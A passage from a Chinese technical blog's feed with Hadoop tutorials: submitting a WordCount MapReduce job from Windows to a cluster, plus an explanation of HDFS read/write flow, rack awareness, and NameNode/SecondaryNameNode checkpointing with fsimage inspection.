class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：如果工程上显示红叉。在项目上右键-&gt;maven-&gt;Reimport即可。<br>（1）将程序打成jar包，然后拷贝到Hadoop集群中<br>步骤详情：右键-&gt;Run as-&gt;maven install。等待编译完成就会在项目的target文件夹中生成jar包。如果看不到。在项目上右键-&gt;Refresh，即可看到。修改不带依赖的jar包名称为wc.jar，并拷贝该jar包到Hadoop集群。<br>（2）启动Hadoop集群<br>（3）执行WordCount程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ hadoop jar  wc.jar com.molly.wordcount.WordcountDriver /user/molly/input /user/molly/output<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>7）在Windows上向集群提交任务<br>    （1）添加必要配置信息</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取配置信息以及封装任务</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置HDFS NameNode的地址</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"fs.defaultFS"</span><span class="token punctuation">,</span> <span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 指定MapReduce运行在Yarn上</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"mapreduce.framework.name"</span><span class="token punctuation">,</span><span class="token string">"yarn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 指定mapreduce可以在远程集群运行</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"mapreduce.app-submission.cross-platform"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//指定Yarn resourcemanager的位置</span>    configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"yarn.resourcemanager.hostname"</span><span class="token punctuation">,</span><span class="token string">"hadoop103"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 设置jar加载路径</span>    job<span class="token punctuation">.</span><span class="token function">setJar</span><span class="token punctuation">(</span><span class="token string">"F:\\idea_project\\main\\bigdata1214\\MapReduce\\target\\MapReduce-1.0-SNAPSHOT.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 设置map和reduce类</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>WordcountMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>WordcountReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 设置map输出</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 5 设置最终输出kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 6 设置输入和输出路径</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 7 提交</span>        <span class="token keyword">boolean</span> result <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>result <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）编辑任务配置<br>        1）检查第一个参数Main class是不是我们要运行的类的全类名，如果不是的话一定要修改！<br>    2）在VM options后面加上 ：-DHADOOP_USER_NAME=molly<br>    3）在Program arguments后面加上两个参数分别代表输入输出路径，两个参数之间用空格隔开。如：hdfs://hadoop102:9820/input hdfs://hadoop102:9820/output</p><p>（3）打包，并将Jar包设置到Driver中</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordcountDriver</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 获取配置信息以及封装任务</span>        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"fs.defaultFS"</span><span class="token punctuation">,</span> <span class="token string">"hdfs://hadoop102:9820"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"mapreduce.framework.name"</span><span class="token punctuation">,</span><span class="token string">"yarn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"mapreduce.app-submission.cross-platform"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"yarn.resourcemanager.hostname"</span><span class="token punctuation">,</span><span class="token string">"hadoop103"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 2 设置jar加载路径</span><span class="token comment" spellcheck="true">//job.setJarByClass(WordCountDriver.class);</span>        job<span class="token punctuation">.</span><span class="token function">setJar</span><span class="token punctuation">(</span><span class="token string">"D:\IdeaProjects\mapreduce\target\mapreduce-1.0-SNAPSHOT.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3 设置map和reduce类</span>        job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>WordcountMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>WordcountReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 4 设置map输出</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 5 设置最终输出kv类型</span>        job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 6 设置输入和输出路径</span>        FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 7 提交</span>        <span class="token keyword">boolean</span> result <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>result <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）提交并查看结果</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-mapreduce1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（三）hdfs-架构解析</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-hdfs3-framework/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-hdfs3-framework/</guid>
      <pubDate>Thu, 12 Nov 2020 06:43:49 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-HDFS的数据流"><a href="#1-HDFS的数据流" class="headerlink" title="1 HDFS的数据流"></a>1 HDFS的数据流</h1><h2 id="1-1-HDFS写数据流程"><a href="#1-1-HDFS写数据流程" class="headerlink" title="1.1 HDFS写数据流程"></a>1.1 HDFS写数据流程</h2><h3 id="1-1-1-剖析文件写入"><a href="#1-1-1-剖析文件写入" class="headerlink" title="1.1.1 剖析文件写入"></a>1.1.1 剖析文件写入</h3><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341373066.png" alt="1638341373066"></p><p>（1）客户端通过Distributed FileSystem模块向NameNode请求上传文件，NameNode检查目标文件是否已存在，父目录是否存在。<br>（2）NameNode返回是否可以上传。<br>（3）客户端请求第一个 Block上传到哪几个DataNode服务器上。<br>（4）NameNode返回3个DataNode节点，分别为dn1、dn2、dn3。<br>（5）客户端通过FSDataOutputStream模块请求dn1上传数据，dn1收到请求会继续调用dn2，然后dn2调用dn3，将这个通信管道建立完成。<br>（6）dn1、dn2、dn3逐级应答客户端。<br>（7）客户<strong>端开始往dn1上传第一个Block（先从磁盘读取数据放到一个本地内存缓存），以Packet为单位，dn1收到一个Packet就会传给dn2，dn2传给dn3；dn1每传一个packet会放入一个应答队列等待应答。</strong><br>（8）当一个Block传输完成之后，客户端再次请求NameNode上传第二个Block的服务器。（重复执行3-7步）。<br>源码解析：org.apache.hadoop.hdfs.DFSOutputStream </p><h3 id="1-1-2-网络拓扑-节点距离计算"><a href="#1-1-2-网络拓扑-节点距离计算" class="headerlink" title="1.1.2 网络拓扑-节点距离计算"></a>1.1.2 网络拓扑-节点距离计算</h3><p>​    在HDFS写数据的过程中，NameNode会选择距离待上传数据最近距离的DataNode接收数据。那么这个最近距离怎么计算呢？<br>节点距离：两个节点到达最近的共同祖先的距离总和。</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341407745.png" alt="1638341407745"></p><p>例如，假设有数据中心d1机架r1中的节点n1。该节点可以表示为/d1/r1/n1。利用这种标记，这里给出四种距离描述。<br>大家算一算每两个节点之间的距离。</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341416287.png" alt="1638341416287"></p><h3 id="1-1-3-机架感知（副本存储节点选择）"><a href="#1-1-3-机架感知（副本存储节点选择）" class="headerlink" title="1.1.3 机架感知（副本存储节点选择）"></a>1.1.3 机架感知（副本存储节点选择）</h3><p><strong>1）官方IP地址</strong><br>机架感知说明<br><a href="http://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html#Data_Replication">http://hadoop.apache.org/docs/r3.1.3/hadoop-project-dist/hadoop-hdfs/HdfsDesign.html#Data_Replication</a><br>For the common case, when the replication factor is three, HDFS’s placement policy is to put one replica on the local machine if the writer is on a datanode, otherwise on a random datanode, another replica on a node in a different (remote) rack, and the last on a different node in the same remote rack. This policy cuts the inter-rack write traffic which generally improves write performance. The chance of rack failure is far less than that of node failure; this policy does not impact data reliability and availability guarantees. However, it does reduce the aggregate network bandwidth used when reading data since a block is placed in only two unique racks rather than three. With this policy, the replicas of a file do not evenly distribute across the racks. One third of replicas are on one node, two thirds of replicas are on one rack, and the other third are evenly distributed across the remaining racks. This policy improves write performance without compromising data reliability or read performance.<br><strong>2）Hadoop3.1.3副本节点选择</strong></p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341452275.png" alt="1638341452275"></p><h2 id="1-2-HDFS读数据流程"><a href="#1-2-HDFS读数据流程" class="headerlink" title="1.2 HDFS读数据流程"></a>1.2 HDFS读数据流程</h2><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341472416.png" alt="1638341472416"></p><p>（1）客户端通过DistributedFileSystem向NameNode请求下载文件，NameNode通过查询元数据，找到文件块所在的DataNode地址。<br>（2）挑选一台DataNode（就近原则，然后随机）服务器，请求读取数据。<br>（3）DataNode开始传输数据给客户端（从磁盘里面读取数据输入流，以Packet为单位来做校验）。<br>（4）客户端以Packet为单位接收，先在本地缓存，然后写入目标文件。</p><h1 id="2-NameNode和SecondaryNameNode（面试开发重点）"><a href="#2-NameNode和SecondaryNameNode（面试开发重点）" class="headerlink" title="2 NameNode和SecondaryNameNode（面试开发重点）"></a>2 NameNode和SecondaryNameNode（面试开发重点）</h1><h2 id="2-1-NN和2NN工作机制"><a href="#2-1-NN和2NN工作机制" class="headerlink" title="2.1 NN和2NN工作机制"></a>2.1 NN和2NN工作机制</h2><p>思考：NameNode中的元数据是存储在哪里的？<br>首先，我们做个假设，如果存储在NameNode节点的磁盘中，因为经常需要进行随机访问，还有响应客户请求，必然是效率过低。因此，元数据需要存放在内存中。但如果只存在内存中，一旦断电，元数据丢失，整个集群就无法工作了<strong>。因此产生在磁盘中备份元数据的FsImage</strong>。<br>这样又会带来新的问题，当在内存中的元数据更新时，如果同时更新FsImage，就会导致效率过低，但如果不更新，就会发生一致性问题，一旦NameNode节点断电，就会产生数据丢失。因此，引入Edits文件(只进行追加操作，效率很高)。每当元数据有更新或者添加元数据时，修改内存中的元数据并追加到Edits中。这样，一旦NameNode节点断电，可以通过FsImage和Edits的合并，合成元数据。<br>但是，如果长时间添加数据到Edits中，会导致该文件数据过大，效率降低，而且一旦断电，恢复元数据需要的时间过长。<strong>因此，需要定期进行FsImage和Edits的合并，如果这个操作由NameNode节点完成，又会效率过低。因此，引入一个新的节点SecondaryNamenode，专门用于FsImage和Edits的合并</strong>。</p><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341524914.png" alt="1638341524914"></p><p><strong>1）第一阶段：NameNode启动</strong><br>（1）第一次启动NameNode格式化后，创建Fsimage和Edits文件。如果不是第一次启动，直接加载编辑日志和镜像文件到内存。<br>（2）客户端对元数据进行增删改的请求。<br>（3）NameNode记录操作日志，更新滚动日志。<br>（4）NameNode在内存中对元数据进行增删改。<br><strong>2）第二阶段：Secondary NameNode工作</strong><br>（1）Secondary NameNode询问NameNode是否需要CheckPoint。直接带回NameNode是否检查结果。<br>（2）Secondary NameNode请求执行CheckPoint。<br>（3）NameNode滚动正在写的Edits日志。<br>（4）将滚动前的编辑日志和镜像文件拷贝到Secondary NameNode。<br>（5）Secondary NameNode加载编辑日志和镜像文件到内存，并合并。<br>（6）生成新的镜像文件fsimage.chkpoint。<br>（7）拷贝fsimage.chkpoint到NameNode。<br>（8）NameNode将fsimage.chkpoint重新命名成fsimage。</p><p><strong>NN和2NN工作机制详解：</strong><br>Fsimage：NameNode内存中元数据序列化后形成的文件。<br>Edits：记录客户端更新元数据信息的每一步操作（可通过Edits运算出元数据）。<br>NameNode启动时，先滚动Edits并生成一个空的edits.inprogress，然后加载Edits和Fsimage到内存中，此时NameNode内存就持有最新的元数据信息。Client开始对NameNode发送元数据的增删改的请求，这些请求的操作首先会被记录到edits.inprogress中（查询元数据的操作不会被记录在Edits中，因为查询操作不会更改元数据信息），如果此时NameNode挂掉，重启后会从Edits中读取元数据的信息。然后，NameNode会在内存中执行元数据的增删改的操作。<br>由于Edits中记录的操作会越来越多，Edits文件会越来越大，导致NameNode在启动加载Edits时会很慢，所以需要对Edits和Fsimage进行合并（所谓合并，就是将Edits和Fsimage加载到内存中，照着Edits中的操作一步步执行，最终形成新的Fsimage）。SecondaryNameNode的作用就是帮助NameNode进行Edits和Fsimage的合并工作。<br>SecondaryNameNode首先会询问NameNode是否需要CheckPoint（触发CheckPoint需要满足两个条件中的任意一个，定时时间到和Edits中数据写满了）。直接带回NameNode是否检查结果。SecondaryNameNode执行CheckPoint操作，首先会让NameNode滚动Edits并生成一个空的edits.inprogress，滚动Edits的目的是给Edits打个标记，以后所有新的操作都写入edits.inprogress，其他未合并的Edits和Fsimage会拷贝到SecondaryNameNode的本地，然后将拷贝的Edits和Fsimage加载到内存中进行合并，生成fsimage.chkpoint，然后将fsimage.chkpoint拷贝给NameNode，重命名为Fsimage后替换掉原来的Fsimage。NameNode在启动时就只需要加载之前未合并的Edits和Fsimage即可，因为合并过的Edits中的元数据信息已经被记录在Fsimage中。</p><h2 id="2-2-Fsimage和Edits解析"><a href="#2-2-Fsimage和Edits解析" class="headerlink" title="2.2 Fsimage和Edits解析"></a>2.2 Fsimage和Edits解析</h2><p><img src="/2020/11/12/bigdata-hdfs3-framework/1638341553613.png" alt="1638341553613"></p><p>1）oiv查看Fsimage文件<br>（1）查看oiv和oev命令</p><p>（2）基本语法<br>hdfs oiv -p 文件类型 -i镜像文件 -o 转换后文件输出路径<br>（3）案例实操</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 current<span class="token punctuation">]</span>$ <span class="token function">pwd</span>/opt/module/hadoop-3.1.3/data/dfs/name/current<span class="token punctuation">[</span>molly@hadoop102 current<span class="token punctuation">]</span>$ hdfs oiv -p XML -i fsimage_0000000000000000025 -o /opt/module/hadoop-3.1.3/fsimage.xml<span class="token punctuation">[</span>molly@hadoop102 current<span class="token punctuation">]</span>$ <span class="token function">cat</span> /opt/module/hadoop-3.1.3/fsimage.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将显示的xml文件内容拷贝到IDEA中创建的xml文件中，并格式化。部分显示结果如下。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>inode</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>16386<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>DIRECTORY<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtime</span><span class="token punctuation">></span></span>1512722284477<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtime</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>permission</span><span class="token punctuation">></span></span>molly:supergroup:rwxr-xr-x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>permission</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nsquota</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nsquota</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dsquota</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dsquota</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>inode</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>inode</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>16387<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>DIRECTORY<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>molly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtime</span><span class="token punctuation">></span></span>1512790549080<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtime</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>permission</span><span class="token punctuation">></span></span>molly:supergroup:rwxr-xr-x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>permission</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nsquota</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nsquota</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dsquota</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dsquota</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>inode</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>inode</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>16389<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>FILE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>wc.input<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>replication</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>replication</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtime</span><span class="token punctuation">></span></span>1512722322219<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtime</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>atime</span><span class="token punctuation">></span></span>1512722321610<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>atime</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>perferredBlockSize</span><span class="token punctuation">></span></span>134217728<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>perferredBlockSize</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>permission</span><span class="token punctuation">></span></span>molly:supergroup:rw-r--r--<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>permission</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blocks</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>block</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1073741825<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>genstamp</span><span class="token punctuation">></span></span>1001<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>genstamp</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>numBytes</span><span class="token punctuation">></span></span>59<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>numBytes</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>block</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>blocks</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>inode</span> <span class="token punctuation">></span></span><span aria-hidden="true" 